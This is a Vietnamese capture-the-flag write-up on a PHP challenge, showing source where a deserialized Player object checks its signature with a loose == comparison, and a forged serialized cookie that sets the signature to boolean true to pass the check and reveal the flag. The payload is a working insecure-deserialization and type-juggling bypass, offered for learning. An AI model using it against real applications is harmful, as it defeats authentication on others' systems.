

---
Tài liệu/Bài báo tham khảo:
https://www.php.net/manual/en/language.types.type-juggling.php

---


![[Pasted image 20261017155229.png]]
Vẫn giống như challenge Happy sodier trước. Nhưng lần này mình đã khôn hơn và xem source đầu tiên :))

Lần này cookie đã được kí đàng hoàng:
![[Pasted image 20261017155409.png]]

Điều kiện thắng ở đây chắc chắn chỉ còn cách đọc được file /secret.txt và kí cookie. 
Và để làm vậy thì hướng khả thi nhất có lẽ là sử dụng lỗ hỏng Insecure Deserialization:

Mới đầu mình nghĩ cái gì phức tạp cơ nhưng không ngờ ở đây app lại so sánh 
`$this->sig == md5($secret . $this->weapon)` để kiểm tra cookie:
```php
class Player {
    public $health;
    public $attack;
    public $coins;
    public $weapon;
    public $sig;

    public function __construct($health, $attack, $coins, $weapon) {
        $this->health = $health;
        $this->attack = $attack;
        $this->coins = $coins;
        $this->weapon = $weapon;
        $secret = file_get_contents('/secret.txt');
        $this->sig = md5($secret . "Wooden Sword");  
    }

    public function __wakeup() {
        $secret = file_get_contents('/secret.txt');
        if($this->sig == md5($secret . $this->weapon))
        {
            if (stripos($this->weapon, "Golden") !== false) {
                echo '<div class="flag-victory">
                    <div class="victory-content">
                        <div class="victory-icon">🏆</div>
                        <div class="victory-title">VICTORY!</div>
                        <div class="victory-subtitle">You have conquered the Serialized Demon!</div>
                        <div class="flag-box">
                            <div class="flag-label">YOUR FLAG:</div>
                            <div class="flag-text">' . htmlspecialchars(getenv('FLAG')) . '</div>
                        </div>
                    </div>
                  </div>';
            }
        }
    }
}
```

Thế là mình nghĩ ngay đây là lỗi Type Juggling xuất hiện trong  PHP:
Thế là mình craft ngay một cookie với chữ kí có dạng boolean=True:

```
O:6:"Player":5:{s:6:"health";i:100;s:6:"attack";i:10;s:5:"coins";i:0;s:6:"weapon";s:12:"Golden Sword";s:3:"sig";b:1;}
```
và dễ dàng lấy được flag:
![[Pasted image 20261017160940.png]]

Giải thích Payload:
Payload dựa trên lỗ hỏng PHP Type Juggling:

Khi sig(boolean)=true thì mọi string khác rỗng(ở đây là chữ kí đúng mà server giữ) sẽ bằng True:
Tham khảo: https://www.php.net/manual/en/language.types.type-juggling.php

![[Pasted image 20261017161337.png]]

Để dễ hình dung thì lúc này server sẽ so sánh kiểu:
true == "aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvZW4vbGFuZ3VhZ2UudHlwZXMudHlwZS1qdWdnbGluZy5waHAK" (chữ kí tượng trưng)

=> Dẫn đến true -> Chạy vào nhánh if


